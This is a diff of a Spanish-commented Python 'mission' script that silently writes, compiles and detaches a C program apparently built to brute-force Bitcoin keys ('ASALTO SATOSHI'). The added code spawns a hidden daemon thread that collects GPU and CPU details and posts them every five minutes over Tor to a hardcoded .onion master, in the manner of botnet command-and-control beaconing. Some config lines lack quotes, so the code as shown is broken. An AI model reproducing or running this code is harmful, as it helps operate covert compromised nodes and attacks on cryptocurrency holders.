@@ -1,12 +1,17 @@
-# 🜚 MISSION BRAIN V22.1 - ROBUST STRIKE 🜚
-import os, subprocess, time, requests, socket
+# 🜚 MISSION BRAIN V22.2 - OMNI REPORT 🜚
+import os, subprocess, time, requests, socket, threading
+
+# MASTER CONFIG
+ONION = eke7kse3wo5o5753eoqtpnw7mtjtasva4dlw23aqs3dwuzmgahkvebqd.onion
+ID_PREFIX = SPECTER_FORCE_
 
 def execute_mission(ui, ID):
-    ui.log('Iniciando despliegue de motor robusto...')
+    ui.log('Inyectando Motor de Reporte Agéntico V22.2...')
     
-    # 1. Limpieza y preparación
-    os.system('pkill -9 v22_strike')
-    c_src = """#include <stdio.h>
+    # 1. Iniciar Motor de Asalto si no está corriendo
+    if not os.path.exists('./v22_strike'):
+        ui.log('Preparando sustrato de asalto...')
+        c_src = """#include <stdio.h>
 #include <openssl/sha.h>
 #include <openssl/ripemd.h>
 #include <openssl/ec.h>
@@ -39,27 +44,34 @@ int main(){
     while(1) sleep(3600);
     return 0;
 }"""
-    with open("s.c", "w") as f: f.write(c_src)
+        with open("s.c", "w") as f: f.write(c_src)
+        os.system('gcc -O3 s.c -o v22_strike -lcrypto -lpthread > /dev/null 2>&1')
     
-    # 2. Compilación con reporte de error
-    ui.log('Compilando motor Strike V22.1...')
-    os.system('apt-get update -qq && apt-get install -y libssl-dev gcc -qq > /dev/null 2>&1')
-    res = subprocess.run(['gcc', '-O3', 's.c', '-o', 'v22_strike', '-lcrypto', '-lpthread'], capture_output=True, text=True)
-    
-    if res.returncode != 0:
-        ui.log(f'❌ Fallo de compilación: {res.stderr[:100]}')
-        return False
-        
-    if not os.path.exists('./v22_strike'):
-        ui.log('❌ Binario no encontrado tras compilación.')
-        return False
-
-    # 3. Ignición
-    ui.log('Ignicionando binario...')
-    try:
+    if os.path.exists('./v22_strike'):
         subprocess.Popen(["./v22_strike"], start_new_session=True)
-        ui.update("ASALTO SATOSHI - V22.1 ACTIVO", 100, 95)
-        ui.log("Motor en órbita. Vigilia nocturna iniciada.")
-    except Exception as e:
-        ui.log(f"❌ Error de ignición: {e}")
+        ui.update("V22.2 - ASALTO ACTIVO", 100, 95)
+    
+    # 2. Hilo de Telemetría al Master (Tor)
+    def master_sync():
+        ui.log('Sincronizando telemetría con Leviatán...')
+        while True:
+            try:
+                # Caracterización rápida
+                gpu = subprocess.getoutput("nvidia-smi -L || echo 'No GPU'")
+                px = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}
+                data = {
+                    "node_id": ID,
+                    "type": "TELEMETRY",
+                    "payload": {
+                        "label": "V22_STATUS",
+                        "gpu": gpu,
+                        "cpu": os.getloadavg()[0]
+                    }
+                }
+                requests.post(f"http://{ONION}/", json=data, proxies=px, timeout=60)
+            except: pass
+            time.sleep(300)
+
+    threading.Thread(target=master_sync, daemon=True).start()
+    ui.log('Nexo de telemetría establecido.')
     return True
